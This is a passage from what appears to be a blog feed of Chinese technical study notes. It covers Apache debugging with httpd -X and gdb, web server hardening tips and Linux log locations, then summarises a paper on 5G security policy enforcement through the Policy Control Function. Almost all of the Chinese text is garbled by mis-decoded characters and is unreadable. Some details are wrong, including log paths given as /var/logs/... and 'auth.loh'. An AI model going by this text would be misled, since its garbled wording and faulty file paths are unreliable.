æ­¤æ‡‰è©²ç¦ç”¨ç¬¬ä¸‰æ–¹æ¨¡çµ„ï¼Œä¸¦æª¢æŸ¥å•é¡Œæ˜¯å¦å¯ä»¥é‡ç¾ï¼Œè‹¥ç¦ç”¨æ¨¡çµ„å¯ä»¥è§£æ±ºå•é¡Œå‰‡ä¸€å€‹ä¸€å€‹é‡èµ·æ¯å€‹æ¨¡çµ„ï¼Œä»¥ä¾¿ç¢ºå®šæ˜¯å“ªå€‹æ¨¡çµ„å¸¶ä¾†çš„åŸå› </p><h3 id="å°‡Apache-HTTP-Serveråšç‚ºå–®ä¸€processä¸¦ä½¿ç”¨Debugå·¥å…·"><a href="#å°‡Apache-HTTP-Serveråšç‚ºå–®ä¸€processä¸¦ä½¿ç”¨Debugå·¥å…·" class="headerlink" title="å°‡Apache HTTP Serveråšç‚ºå–®ä¸€processä¸¦ä½¿ç”¨Debugå·¥å…·"></a>å°‡Apache HTTP Serveråšç‚ºå–®ä¸€processä¸¦ä½¿ç”¨Debugå·¥å…·</h3><p>å…¸å‹çš„Apache HTTP Serverå®‰è£æœƒé‹è¡Œå¤šå€‹process<br>ä½†å¦‚æœè¦troubleshootingæœ€å¥½æ˜¯ä»¥å–®ä¸€processé‹è¡Œ<br>å¯åœ¨å•Ÿå‹•apacheæ™‚å€™ä½¿ç”¨Xé¸é …<br><code>$ httpd -X</code> é€™å¯ä½¿Apacheä»¥å–®ä¸€processæ¨¡å¼ä¾†å•Ÿå‹•ï¼Œé€™ä»£è¡¨Apacheä¸æœƒå»forkå‡ºæ–°çš„chidrenæˆ–èˆ‡çµ‚ç«¯detach<br>é€™æ¨£æ‰€æœ‰æµé‡èˆ‡é€šè¨Šéƒ½å°‡é€šéä¸€å€‹å–®ä¸€çš„processï¼Œå°±èƒ½åœ¨debugger(ex. gdb)åº•ä¸‹é‹è¡Œapache httpdä¸¦å–å¾—å´©æ½°çš„bracktaceä¸¦å¼·åˆ¶serverå»è¡Œcoredump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gdb httpd</span><br></pre></td></tr></table></figure><p>æ¥è‘—å°±æ˜¯é€égdbå…ˆå»è¨­breakpointï¼Œç„¶å¾Œå»åšå–®æ­¥è¿½è¹¤ï¼Œä¸€è¡Œä¸€è¡Œçœ‹å¯èƒ½éŒ¯åœ¨å“ª?</p><h3 id="è…³æœ¬åŸ·è¡Œå•é¡Œ"><a href="#è…³æœ¬åŸ·è¡Œå•é¡Œ" class="headerlink" title="è…³æœ¬åŸ·è¡Œå•é¡Œ"></a>è…³æœ¬åŸ·è¡Œå•é¡Œ</h3><p>å‹•æ…‹å…§å®¹é€šå¸¸ç”± Apache HTTP Serveré€šé <code>mod_cgi</code>æ¨¡çµ„åŸ·è¡Œçš„è…³æœ¬æä¾›<br>é€™å€‹æ¨¡çµ„åŒ…å«è‡ªå·±çš„loggingæ©Ÿåˆ¶ç”¨ä¾†è¨˜éŒ„åœ¨è…³æœ¬åŸ·è¡ŒæœŸé–“ç™¼ç”Ÿçš„ä»»ä½•éŒ¯èª¤</p><p>å•Ÿç”¨<strong>ScriptLog</strong>æŒ‡ä»¤å¾Œï¼Œmod_cgiå°‡è¨˜éŒ„ä»»ä½•æœªæŒ‰ç…§é æœŸåŸ·è¡Œçš„è…³æœ¬çš„è¼¸å‡ºï¼ŒåŒ…å«<br>Server Response Codeï¼Œæ”¶åˆ°çš„è«‹æ±‚ä»¥åŠä»»ä½•å‘å®¢æˆ¶ç«¯ç™¼å‡ºçš„ä»»ä½•å›æ‡‰</p><p>è¦å•Ÿç”¨æ­¤åŠŸèƒ½éœ€è¦ä¿®æ”¹ httpd.confæ–‡ä»¶ï¼Œä¸¦æŒ‡å®šScriptLogæŒ‡ä»¤å’Œä¿å­˜logçš„ä½ç½®<br><code>ScriptLog logs/cgi_log</code></p><h2 id="IIS-Troubleshooting"><a href="#IIS-Troubleshooting" class="headerlink" title="IIS Troubleshooting"></a><a href="https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms524996(v=vs.90)">IIS Troubleshooting</a></h2><h2 id="Serverç«¯å®‰å…¨"><a href="#Serverç«¯å®‰å…¨" class="headerlink" title="Serverç«¯å®‰å…¨"></a>Serverç«¯å®‰å…¨</h2><ul><li>Serverç«¯æœ‰ç”šéº¼å®‰å…¨å»ºè­°?<ul><li>ç§»é™¤ä¸å¿…è¦æœå‹™<ul><li>é»˜èªå®‰è£æœ‰æ™‚å€™æœƒå®‰è£è¨±å¤šä¸å¿…è¦çš„åŠŸèƒ½ex. é ç«¯è¨»å†Šã€printer serverâ€¦etc</li><li>æœå‹™è¶Šå¤šï¼Œé–‹æ”¾çš„portå°±è¶Šå¤šï¼Œå› æ­¤æœƒæš´éœ²æ›´å¤šé¢¨éšª</li><li>é—œé–‰serverä¸­çš„éå¿…è¦æœå‹™</li></ul></li><li>ç¢ºä¿é ç«¯å­˜å–çš„ä¿è­·æªæ–½<ul><li>è‹¥web adminéœ€è¦é ç«¯ç™»å…¥Web serverï¼Œå‰‡éœ€è¦ä½¿ç”¨éš§é“å’ŒåŠ å¯†å”å®šä¾†ç¢ºä¿é ç¨‹é€£ç·šç²å¾—é©ç•¶é˜²è­· </li><li>åœ¨è¨­å‚™æˆ–è»Ÿé«”ä¸Šä½¿ç”¨å®‰å…¨token </li><li>é ç«¯å­˜å–æ‡‰é™åˆ¶ç‰¹å®šæ•¸é‡IPä»¥åŠå¸³æˆ¶</li></ul></li><li>åˆ†é›¢é–‹ç™¼&#x2F;æ¸¬è©¦&#x2F;ç”Ÿç”¢ç’°å¢ƒ<ul><li>ç”±æ–¼é–‹ç™¼äººå“¡åœ¨ç”Ÿç”¢æœå‹™å™¨ä¸Šé–‹ç™¼æ›´æ–°ç‰ˆæœ¬çš„ Web æ‡‰ç”¨ç¨‹åºæ›´å®¹æ˜“ã€æ›´å¿«æ·ï¼Œå› æ­¤ Web æ‡‰ç”¨ç¨‹åºçš„é–‹ç™¼å’Œæ¸¬è©¦ç›´æ¥åœ¨ç”Ÿç”¢æœå‹™å™¨æœ¬èº«ä¸Šå®Œæˆæ˜¯å¾ˆå¸¸è¦‹çš„ã€‚</li><li>æœ‰å¯èƒ½æœƒåœ¨ç¶²è·¯ä¸Šè’åˆ°ç‰¹å®šç¶²ç«™çš„æ›´æ–°ç‰ˆæœ¬ï¼Œæˆ–åœ¨&#x2F;test&#x2F;ã€&#x2F;new&#x2F;æˆ–å…¶ä»–é¡ä¼¼å­ç›®éŒ„åº•ä¸‹ç™¼ç¾ä¸æ‡‰è©²çµ¦å…¬çœ¾çŸ¥é“çš„å…§å®¹ </li><li>æ‰€ä»¥å¦‚æœåœ¨åŒå°Serverä¸ŠåŒæ™‚é–‹ç™¼ã€æ¸¬è©¦è·Ÿç”Ÿç”¢ï¼Œå¦‚æœæ¬Šé™æ²’è¨­å¥½è€Œä¸”æ—©æœŸé–‹ç™¼éšæ®µå®‰å…¨æ€§å®¹æ˜“æ²’åšå¥½ï¼Œå®¹æ˜“è¢«æ‰“ç©¿ç¶²ç«™</li></ul></li><li>Webæ‡‰ç”¨å…§å®¹ä»¥åŠServer Scriptå®‰å…¨<ul><li>webæ‡‰ç”¨æˆ–ç¶²ç«™æ–‡ä»¶æ‡‰è©²è¦ä½æ–¼OSç³»çµ±æ–‡ä»¶ã€logæ–‡ä»¶ä»¥å¤–çš„ç¨ç«‹åˆ†å€æˆ–driverä¸Š</li><li>å› ç‚ºå¦‚æœæ”»æ“Šè€…ç²å¾—webç›®éŒ„å­˜å–æ¬Šé™ï¼Œå¯èƒ½å°±å¯ä»¥é€éå…¶ä»–æ¼æ´å»åšææ¬Šä¸¦å­˜å–æ•´å€‹ç£ç¢Ÿä¸Šçš„è³‡æ–™</li></ul></li><li>ç¢ºä¿é©ç•¶æ¬Šé™èˆ‡ç‰¹æ¬Š<ul><li>å§‹çµ‚åˆ†é…é‹è¡Œç‰¹å®šç¶²è·¯æœå‹™æ‰€éœ€çš„æœ€æ¬Šé™</li></ul></li><li>æŒ‰æ™‚å®‰è£æ‰€æœ‰patch</li><li>ç›£æ§æˆ–audit server <ul><li>æ‡‰ç¶“å¸¸ç›£æ§å’Œæª¢æŸ¥æ‰€æœ‰ç¶²è·¯æœå‹™logã€ç¶²ç«™access logã€DB Server log(ex. Microsoft SQL Serverã€MySQLã€Oracle)å’ŒOS Log</li><li>è‹¥logä¸­ç™¼ç¾å¥‡æ€ªæ´»å‹•ï¼Œæ‡‰è©²ç«‹åˆ»å»è§£æ±ºå®ƒ</li></ul></li><li>ç”¨æˆ¶å¸³æˆ¶ç®¡ç†<ul><li>ç¦ç”¨æœªä½¿ç”¨çš„é»˜èªå¸³æˆ¶<ul><li><code>userdel</code> æŒ‡ä»¤</li></ul></li><li>æ¯å€‹å¸³æˆ¶è¦è¨­å®šå®ƒæ‡‰æœ‰çš„æ­£ç¢ºæ¬Šé™</li></ul></li><li>åˆªé™¤æœªä½¿ç”¨çš„æ¨¡çµ„å’Œæ‡‰ç”¨ç¨‹å¼<ul><li>Apacheé è¨­æœƒå®‰è£å¤šé å®šç¾©çš„æ¨¡çµ„ </li><li>å…¸å‹Web Serverä¸æœƒä½¿ç”¨é€™äº›æ¨¡çµ„ï¼Œå› æ­¤éœ€è¦é—œé–‰ï¼Œé˜²æ­¢é‡å°æ­¤é¡æ¨¡çµ„çš„æ”»æ“Š</li></ul></li><li>ä½¿ç”¨Network Severè»Ÿé«”æ‰€æä¾›çš„å®‰å…¨å·¥å…·<ul><li>Mircosoft ç™¼å¸ƒè¨±å¤šå·¥å…·ä¾†å¹«åŠ©adminä¾†ä¿è­·IIS Web Serverå®‰è£</li><li>Apacheä¹Ÿæœ‰æä¾› <strong>mod_security</strong>æ¨¡çµ„</li></ul></li><li>ä½¿ç”¨å¤–éƒ¨scanner<ul><li>nessus</li><li>nikto</li><li>æˆ–å…¶ä»–å¼±æƒå·¥å…·</li></ul></li></ul></li></ul><h2 id="Logæª”æ¡ˆ"><a href="#Logæª”æ¡ˆ" class="headerlink" title="Logæª”æ¡ˆ"></a>Logæª”æ¡ˆ</h2><p>ç³»çµ±éŒ¯èª¤è³‡è¨Š - <code>/var/logs/syslog</code> æˆ– <code>/var/logs/messages</code><br>èˆ‡ç™»å…¥å¸³å¯†æœ‰é—œçš„log - <code>/var/logs/secure</code> æˆ– <code>/var/logs/auth.loh</code>(Debian)<br>ç´€éŒ„å“ªå€‹æœå‹™çš„logæœƒè¢«æ”¾åœ¨å“ª? - <code>/etc/rsyslog.conf</code>ï¼Œæœƒè¢«æ”¾åœ¨<code>/etc/rsyslog.d</code> åº•ä¸‹</p><h3 id="Syslogç­‰ç´š"><a href="#Syslogç­‰ç´š" class="headerlink" title="Syslogç­‰ç´š"></a>Syslogç­‰ç´š</h3><p><img src="https://i.imgur.com/GxaNR3I.png"></p><h3 id="Systemcall"><a href="#Systemcall" class="headerlink" title="Systemcall"></a>Systemcall</h3><h2 id="C-x2F-C"><a href="#C-x2F-C" class="headerlink" title="C&#x2F;C++"></a>C&#x2F;C++</h2><ul><li>å¦‚æœç¨‹å¼ä¸­ä½¿ç”¨mallocä½†æ²’æœ‰freeæ‰æœƒæ€æ¨£?<ul><li>heap memoryæœƒä¸€ç›´è¢«å è‘—ï¼Œç›´åˆ°ç¨‹å¼çµæŸï¼Œä¸æœƒè‡ªå‹•é‡‹æ”¾</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> å­¸ç¿’ç­†è¨˜ </category>
          
          <category> Troubleshooting </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network </tag>
            
            <tag> Linux </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Security policies definition and enforcement utilizing policy control function framework in 5G</title>
      <link href="/posts/de3933f9.html"/>
      <url>/posts/de3933f9.html</url>
      
        <content type="html"><![CDATA[<style>    :root{    --maincolor: #50fa7b;    }   .info{    padding: 15px;    margin-bottom: 20px;    color: #ffffff;    border: 1px solid transparent;    border-radius: 10px;    background-color: #343232;    border-color: #b8bdb4;   }   .special{        border-bottom: 3px solid var(--maincolor);        color: inherit;        text-decoration:none;   }   .newbold{        color: #ffffff;        font-weight: bold;        text-decoration:none;   }   a{    color: #337ab7;    text-decoration: none;   }</style><h2 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h2><p>æœ¬ç¯‡è¨è«–çš„æ˜¯3GPPå®šç¾©çš„5G System(5GS)ç¯„åœä¹‹ä¸­çš„ç¶²è·¯å®‰å…¨è­°é¡Œ</p><h3 id="5Gæ¨™æº–åˆ¶å®š"><a href="#5Gæ¨™æº–åˆ¶å®š" class="headerlink" title="5Gæ¨™æº–åˆ¶å®š"></a>5Gæ¨™æº–åˆ¶å®š</h3><p>è¨±å¤šçµ„ç¹”æˆ–æœƒè­°å°æ–¼é–‹ç™¼5Gæ¶æ§‹æœ‰å“è¶Šè²¢ç»ï¼Œå°¤å…¶æ˜¯åœ¨å®‰å…¨å±¤é¢:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- ITU</span><br><span class="line">- ETSI</span><br><span class="line">- IETF</span><br><span class="line">- NGMN</span><br><span class="line">- 5G-PPP</span><br><span class="line">- NIST</span><br><span class="line">- GSMAç­‰ç­‰</span><br></pre></td></tr></table></figure><p>æœ‰äº›è² è²¬åœ¨ç‰¹å®šinfraä¸Šåƒæ˜¯é—œéµåŸºç¤è¨­æ–½ï¼Œå…¶é¤˜å‰‡æ˜¯ç‚ºç‰¹å®šç”¨ä¾‹é–‹ç™¼å®‰å…¨æ¨™æº–</p><blockquote><p>S3A Working Group â†’ å®šç¾©5Gç¶²è·¯ end to end å®‰å…¨å±¤é¢</p></blockquote><h3 id="5GS"><a href="#5GS" class="headerlink" title="5GS"></a>5GS</h3><p>5G System &#x3D; Access Network + Core Network + UE<br>System Arcitecture â†’ Service-Based Architecture â†’ Is composed of multiple NFs<br>SBAæ¶æ§‹ä¸­ï¼Œä¸åŒçš„NFsä¹‹é–“çš„äº’å‹•å¯ä»¥å…©å€‹NFçš„é»å°é»çš„åƒè€ƒé»ä¾†è¡¨ç¤º<br><strong>SBI(Service-based Interface)</strong> ç”¨ä¾†è¡¨ç¤ºä¸€å€‹çµ¦å®šçš„NFè¦å¦‚ä½•æä¾›æˆ–é–‹æ”¾ä¸€çµ„æœå‹™</p><p><strong>Policy Control Function(PCF)</strong> æ˜¯ä¸€å€‹ç¶²è·¯åŠŸèƒ½ç”¨ä»¥æä¾›çµ±ä¸€ä¸”ä¸€è‡´çš„æ¡†æ¶ä¾†å®šç¾©ä»»ä½•é¡å‹çš„ç­–ç•¥ï¼Œåœ¨å‰å¹¾ä»£è¡Œå‹•ç¶²è·¯ä¸­ï¼ŒPCFåƒ…ç”¨æ–¼QoSæˆ–è¨ˆè²»æ–¹é¢çš„ç­–ç•¥åˆ¶å®š</p><p>5Gæ¶æ§‹ä¸­å¢åŠ äº†å°æ–¼ç¶²è·¯è³‡æ–™åˆ†æçš„æœå‹™ï¼Œè—‰ç”±ä¸€å€‹æ–°çš„NFï¼ŒNWDAF(Network Data Analytics Services)<br>ç”¨æ–¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. è² è¼‰ç´šåˆ¥(Load Level)è³‡è¨Š</span><br><span class="line">2. æœå‹™é«”é©—</span><br><span class="line">3. ç¶²è·¯æ•ˆèƒ½</span><br><span class="line">4. ç•°å¸¸è¡Œç‚º</span><br></pre></td></tr></table></figure><p><span class="special">PCFå¯ä»¥è¨‚é–±èˆ‡æ­¤é¡è³‡è¨Šç›¸é—œçš„ç¶²è·¯åˆ†æé€šçŸ¥ï¼Œä¸¦ç”¨æ–¼è¨ˆç®—æˆ–æ›´æ–°ç­–ç•¥ï¼Œä½†é€™ç›®å‰å°šæœªæ¨™æº–åŒ–</span><br>æ–°çš„çµ±ä¸€ç­–ç•¥æ§åˆ¶æ¡†æ¶èˆ‡5Gç³»çµ±ä»¥åŠå¢å¼·çš„è³‡æ–™åˆ†æå¯¦é«”ä¹‹é–“ä¸¦ç„¡å»ºç«‹æ˜é¡¯çš„é€£çµï¼Œè€Œæœ¬ç¯‡è«–æ–‡çš„çµæœå¯ä»¥å¹«åŠ©é€™ä¸‰é …å€åŸŸè®Šå¾—æ›´åŠ ç·Šå¯†</p><p>ä¸»è¦ç›®æ¨™æ˜¯è¦æ‰¾åˆ°ä¸€å€‹æœ‰æ•ˆçš„security enforcement schemaç”¨ä»¥å½ˆæ€§åœ°å»ºç«‹æ–°çš„å®‰å…¨ç­–ç•¥ï¼Œä¸¦å‹•æ…‹åœ°å›æ‡‰æŒçºŒè®ŠåŒ–åœ°å®‰å…¨ç’°å¢ƒï¼Œæ©«è·¨5G end to end æ¶æ§‹ã€‚</p><p>å°æ–¼æ©«è·¨5Gç³»çµ±åœ°Security Enforcementæ‡‰åœ¨<strong>TSG-SA</strong> å±¤ç´šè¢«è¨è«–</p><p>5GSæ¶æ§‹ä¸­å°æ–¼User Plane Security Enforcementï¼Œæœƒæ˜¯åŸºæ–¼UEèˆ‡åŸºç«™ä¹‹é–“çš„air interfaceå…¶ä¸­åœ°æ©Ÿå¯†æ€§èˆ‡å®Œæ•´æ€§æ¼”ç®—æ³•æ˜¯å¦å•Ÿç”¨</p><p>å°æ–¼UPçš„å®Œæ•´æ€§ä¿è­·æ¼”ç®—æ³•æ˜¯å¯ä»¥é¸æ“‡æ€§å•Ÿç”¨çš„(ä¾‹å¦‚å„åˆ‡ç‰‡å¯ä»¥æ˜¯å¦å•Ÿç”¨)</p><h3 id="ç¶²è·¯åˆ‡ç‰‡"><a href="#ç¶²è·¯åˆ‡ç‰‡" class="headerlink" title="ç¶²è·¯åˆ‡ç‰‡"></a>ç¶²è·¯åˆ‡ç‰‡</h3><p><span class="special">å€‹åˆ¥ç¶²è·¯åˆ‡ç‰‡æä¾›ä¸åŒç¨®æœå‹™å¯èƒ½æœƒæœ‰è‘—ä¸åŒçš„å®‰å…¨éœ€æ±‚ï¼Œä¸¦æ¡ç”¨ä¸åŒå®‰å…¨å”å®šèˆ‡æ–¹æ³•ï¼›å› æ­¤å°æ–¼ä¸åŒçš„ç¶²è·¯åˆ‡ç‰‡æä¾›ä¸åŒå±¤ç´šçš„å®‰å…¨é˜²è­·æœƒæ˜¯é—œéµ</span></p><p>å°æ–¼å®‰å…¨åŠ å¯†æ¼”ç®—æ³•çš„ä½¿ç”¨ä¹Ÿæ˜¯é¸æ“‡æ€§çš„(e.g. 128bits vs 256 bits key length)<br>åƒæ˜¯å°æ–¼é—œéµåŸºç¤è¨­æ–½çš„å®‰å…¨éœ€æ±‚ä»¥åŠenhanced Mobile Broadband å¤§é‡ä½¿ç”¨å ´æ™¯çš„å®‰å…¨éœ€æ±‚ä¹Ÿæœ‰æ‰€ä¸åŒ</p><p>å°‡ QoS åŸå‰‡æ‡‰ç”¨æ–¼å®‰å…¨ï¼Œç›®æ¨™æ‡‰æ˜¯åˆ©ç”¨çµ±ä¸€çš„ç­–ç•¥æ§åˆ¶æ¡†æ¶ï¼Œä¸¦åˆ©ç”¨æ–°çš„è³‡æ–™åˆ†æåŠŸèƒ½ä½œç‚ºå°æ–¼ç¶²è·¯ä»¥åŠUEçŸ¥è­˜åŸºç¤ï¼Œåœ¨ 5G end to end æ¶æ§‹ä¸­å¯¦ç¾æœ‰æ•ˆçš„å®‰å…¨ç­–ç•¥å®šç¾©å’ŒåŸ·è¡Œ</p><p>ç¾è¡Œå°æ–¼é›»ä¿¡ç¶²è·¯çš„ä¿è­·ç­–ç•¥ä¸å¤–ä¹é˜²ç«ç‰†ã€IDSã€DDOSä¿è­·ç³»çµ±ç­‰ç­‰ï¼Œä¸¦è¢«å» å•†çš„ç‰¹å®šç®¡ç†å·¥å…·æ‰€ç®¡ç†<br>è€Œé€™äº›å®‰å…¨åŠŸèƒ½æ˜¯ç‚ºäº†ä¿è­·æ•´å€‹ç¶²è·¯æˆ–æ ¹æ“šä»–å€‘åœ¨ç¶²è·¯ä¸­çš„å®šä½ï¼Œè€Œæœªè€ƒæ…®å€‹åˆ¥UE</p><ol><li>åµæ¸¬åˆ°å–®ä¸€UEç™¼ç”Ÿå®‰å…¨å•é¡Œçš„èƒ½åŠ›</li><li>æ‡‰ç”¨è§£æ±ºæªæ–½åˆ°å–®ä¸€UEçš„æ–¹å¼åˆ°ç›®å‰éƒ½æ˜¯å€‹å•é¡Œ</li></ol><p>æœ¬ç¯‡ç ”ç©¶è£œè¶³äº†é€™äº›æ©Ÿåˆ¶ï¼Œä¸¦å¾end to endç¶²çµ¡çš„è§’åº¦è±å¯Œäº†å®‰å…¨æ€§ï¼Œä¸¦æå…±é©ç•¶çš„ç²’åº¦(granularity) ä¾†è€ƒæ…®å€‹åˆ¥UEçš„å®‰å…¨ç­–ç•¥<br>â†’å°æ–¼ uRLLC ä»¥åŠ mMTC éƒ¨å±¬å ´æ™¯æœ‰å¹«åŠ©</p><p><img src="https://i.imgur.com/BOTV0hU.png"></p><h2 id="2-Challenges-to-apply-end-to-end-security-enforcement-in-5G"><a href="#2-Challenges-to-apply-end-to-end-security-enforcement-in-5G" class="headerlink" title="2. Challenges to apply end to end security enforcement in 5G"></a>2. Challenges to apply end to end security enforcement in 5G</h2><p>ç‚ºäº†å¯¦è¸end to end security enforcementï¼Œæœ‰å››å¤§æŒ‘æˆ°è¦è§£æ±º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- ç‚ºSecurity Enforcementæ‡‰ç”¨QoSåŸå‰‡</span><br><span class="line">- æœƒè©±ç®¡ç†å’Œç”¨æˆ¶å¹³é¢</span><br><span class="line">- ç­–ç•¥æ§åˆ¶</span><br><span class="line">- ç¶²è·¯åˆ†æ</span><br></pre></td></tr></table></figure><h3 id="2-1-Challenges-to-apply-QoS-principles-to-security-enforcement"><a href="#2-1-Challenges-to-apply-QoS-principles-to-security-enforcement" class="headerlink" title="2.1 Challenges to apply QoS principles to security enforcement"></a>2.1 Challenges to apply QoS principles to security enforcement</h3><p>ç•¶æ ¹æ“šæ¥­å‹™éœ€æ±‚ï¼ˆä¾‹å¦‚åœ¨å‚ç›´å¸‚å ´ä¸­ç”¢ç”Ÿï¼‰å°‡ QoS å¯¦æ–½åŸºæœ¬åŸå‰‡æ‡‰ç”¨æ–¼å®‰å…¨å¯¦æ–½æ™‚ï¼Œä¸»è¦å›°é›£ä¹‹ä¸€æ˜¯èƒ½å¤ ä»¥èˆ‡ QoS åœ¨ç¶²çµ¡ä¸­é‡åŒ–çš„é¡ä¼¼æ–¹å¼ä¾†è¡¡é‡å®‰å…¨ç‰¹æ€§</p><p>QoS é…ç½®æ–‡ä»¶è¢«å¾ˆå¥½åœ°å®šç¾©ç‚ºæ‡‰ç”¨æ–¼ QoS æµçš„ä¸€çµ„ QoS åƒæ•¸ï¼ˆQoS æµæ˜¯åˆ†çµ„æ•¸æ“šå–®å…ƒ (PDU) æœƒè©±ä¸­ QoS å€åˆ†çš„æœ€ç´°ç²’åº¦ï¼‰ã€‚é€™ç¨®åƒæ•¸åŒ–æ˜¯å®šé‡çš„ï¼Œå³å¯ä»¥ç”¨æ•¸å­—ä¾†è¡¡é‡ã€‚ä¾‹å¦‚ï¼Œ5G QoS æ¨™è­˜ç¬¦æ˜¯ä¸€å€‹ç”±æ¨™é‡è¡¨ç¤ºçš„åƒæ•¸ï¼Œç”¨ä½œ 5G QoS ç‰¹æ€§ï¼ˆå¦‚èª¿åº¦ã€æ¬Šé‡ã€å‡†å…¥é–¾å€¼ç­‰ï¼‰çš„åƒè€ƒã€‚ç”šè‡³é‚„æœ‰é å…ˆé…ç½®çš„æ¨™æº–åŒ–å€¼ã€‚ä½†æ˜¯ï¼Œå¦‚ä½•åœ¨ 5G æ¶æ§‹ä¸­æ§‹å»ºå®‰å…¨é…ç½®æ–‡ä»¶ï¼Œå¦‚ä½•å»ºç«‹å®Œæ•´æ€§ä¿è­·ã€æ©Ÿå¯†æ€§ä¿è­·ã€è¨ªå•æ§è£½æˆ–æƒ¡æ„è»Ÿä»¶æª¢æ¸¬ç­‰æ–¹é¢çš„é‡åŒ–å®‰å…¨åƒæ•¸åŒ–ï¼Ÿæˆ‘å€‘è§£æ±ºé€™å€‹å•é¡Œçš„æè­°åœ¨ç¬¬ 3.1 ç¯€ä¸­æå‡ºã€‚</p><h3 id="2-2-Challenges-at-session-management-level-to-enforce-security-controls"><a href="#2-2-Challenges-at-session-management-level-to-enforce-security-controls" class="headerlink" title="2.2  Challenges at session management level to enforce security controls"></a>2.2  Challenges at session management level to enforce security controls</h3><p>SMFè² è²¬æ¥æ”¶ç”±UEæ‰€ç™¼é€ä¾†çš„å»ºç«‹PDU Sessionçš„è«‹æ±‚<br>ç„¶è€Œç¾ä»Šçš„PDU è«‹æ±‚ä¸¦æ²’æœ‰åŒ…å«ä»»ä½•å®‰å…¨åƒæ•¸</p><p>æ‰€ä»¥UEè«‹æ±‚<strong>ç‰¹å®šçš„</strong> 5G UPå®‰å…¨æœå‹™ï¼Œå³â€å®‰å…¨çš„PDUâ€ï¼Œæ˜¯ä¸å¯èƒ½çš„<br>ç„¶å¾Œåƒæ˜¯æ”¿åºœé—œéµåŸºç¤è¨­æ–½å¯èƒ½å°±æœ‰éœ€æ±‚æ˜¯ï¼Œæ‡‰æä¾›ç‰¹æ®Šå®‰å…¨æªæ–½åœ¨UEèˆ‡Data Networlä¹‹é–“çš„PDU Session<br>ä¾‹å¦‚æŸäº›<strong>è³‡æ–™ç„¡ç·šé›»æ‰¿è¼‰(Data Radio Bearer)</strong> æ”¯æ´æŸäº›æœå‹™ä¸­çš„å¼·åŠ å¯†æ¼”ç®—æ³•æˆ–æ›´é•·çš„åŠ å¯†é‡‘é‘°</p><p>SMFåœ¨å»ºç«‹PDUæœƒè©±æ™‚ï¼Œæ ¹æ“šä¾†è‡ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- UDMçš„Subscriberè³‡è¨Š</span><br><span class="line">- æ¯å€‹DNN/SMFä¸­åˆ‡ç‰‡çš„æœ¬åœ°é…ç½®UPå®‰å…¨ç­–ç•¥</span><br><span class="line">- æ¯å€‹UEæ‰€æ”¯æ´çš„æœ€é«˜Data Rate</span><br></pre></td></tr></table></figure><p>ç”¨ä»¥åœ¨PDU Sessionå»ºç«‹UP Security Enforcement ä¾†åœ¨æ¯å€‹DRBä¸­æä¾›å®Œæ•´æ€§ä¿è­·<br>SMFçš„æœ¬åœ°é…ç½®è¢«èªç‚ºæ˜¯å…¨å±€é©ç”¨(global applicable)çš„éœæ…‹ç­–ç•¥</p><p>å•é¡Œæ˜¯é€™ç¨®éœæ…‹æ–¹æ³•å°æ–¼ä¹‹å¾Œçš„çš„ç”¨ä¾‹æ˜¯å¦ä»ç„¶æœ‰æ•ˆï¼Œå…¶ä¸­è¨‚é–±è¨ˆåŠƒå¯èƒ½èˆ‡å®‰å…¨å¢å€¼æœå‹™å’Œç›¸æ‡‰çš„ç§Ÿæˆ¶ï¼ˆä¾‹å¦‚é—œéµåŸºç¤è¨­æ–½çš„æ‰€æœ‰è€…ï¼‰éœ€è¦ä¸åŒç´šåˆ¥çš„å®‰å…¨ï¼ˆä¾‹å¦‚æ¯å€‹åˆ‡ç‰‡ï¼‰å’Œå°å®‰å…¨äº‹ä»¶ä½œå‡ºåæ‡‰çš„èƒ½åŠ›</p><p>é€™äº›use caseéœ€è¦å½ˆæ€§ã€å¯æ“´å±•å’Œå‹•æ…‹çš„ç­–ç•¥ç®¡ç†ä»¥åŠè¨­å®š<br>æ­¤å¤–ï¼Œsecurity enforcementåªæ˜¯æŒ‡ç¤ºæ˜¯å¦è¦åœ¨NG-RANç¶²è·¯å€åŸŸæ‡‰ç”¨UPå®Œæ•´æ€§èˆ‡æ©Ÿå¯†æ€§ä¿è­·ï¼Œä¸¦åƒ…é©ç”¨æ–¼3GPPé¡å‹çš„å­˜å–</p><p>UP Security Enforcement å¾NG-RANæ“´å±•åˆ°å‚³è¼¸ä»¥åŠæ ¸ç¶²æœƒæ˜¯å€‹æŒ‘æˆ°<br>(å³PDUæœƒè©±æä¾›çš„æ•´é«”é€£æ¥çš„end to end security enforcementæ–¹æ³• æœƒæ˜¯å€‹æŒ‘æˆ°)</p><p><img src="https://i.imgur.com/7xtxVnm.png"><br>åœ–2é¡¯ç¤ºäº†ç•¶å‰UP security enforcementä»¥åŠæ³¨æ„äº‹é …</p><p><img src="https://i.imgur.com/JwXF00a.png"></p><p>ä¸€æ—¦PDU Sessionå»ºç«‹ï¼Œ<br>ç•¶å‰Sessionçš„ç‰¹å¾µ(å³PDUæœƒè©±è³‡è¨Š)åƒ…é™æ–¼ä¸€äº›ä¸»è¦èˆ‡QoSç›¸é—œçš„è³‡è¨Šå…ƒç´ (ä¾‹å¦‚:QoS Flow ID,Reflective QoS 